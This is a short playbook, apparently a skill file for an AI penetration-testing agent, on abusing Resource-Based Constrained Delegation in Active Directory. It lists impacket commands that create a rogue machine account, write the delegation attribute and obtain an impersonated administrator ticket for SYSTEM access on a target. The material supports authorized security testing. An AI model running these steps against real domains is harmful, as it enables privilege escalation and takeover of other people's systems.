---
name: rbcd
services: [rbcd]
summary: Resource-Based Constrained Delegation — write delegation to a computer you control
---

# RBCD playbook

If you can write `msDS-AllowedToActOnBehalfOfOtherIdentity` on a computer object, you can
impersonate any user to that computer (→ local admin / code exec). The write right comes from a
DACL edge on the computer or owning it. Use impacket `rbcd`/`getST` via `local_exec`. The commands
below are **examples** — compose your own.

## Prerequisites
- A computer account you control. If MachineAccountQuota > 0 (default 10), make one:
  - Example: `impacket-addcomputer <domain>/<user>:<pass> -computer-name EVIL$ -computer-pass <pw> -dc-ip <dc>`
- Write access over the TARGET computer (BloodHound: GenericWrite/GenericAll/Owns).

look for: `ms-DS-MachineAccountQuota` (query it via `ldapsearch_query`) and a write edge to a computer.

## Configure & abuse
- Example (set RBCD): `impacket-rbcd <domain>/<user>:<pass> -delegate-from EVIL$ -delegate-to TARGET$ -action write -dc-ip <dc>`
- Example (ticket as admin to the target): `impacket-getST -spn cifs/target.<domain> -impersonate administrator <domain>/EVIL$:<pw>`
- Example (use it): set `KRB5CCNAME`, then drive `netexec`/impacket with `-k` for SYSTEM on the target

look for: `getST` returns a service ticket impersonating a privileged user → local admin on TARGET.

## Record
RBCD onto a DC or admin host = critical; `record_persistence` the attribute write (cleanup: clear it).
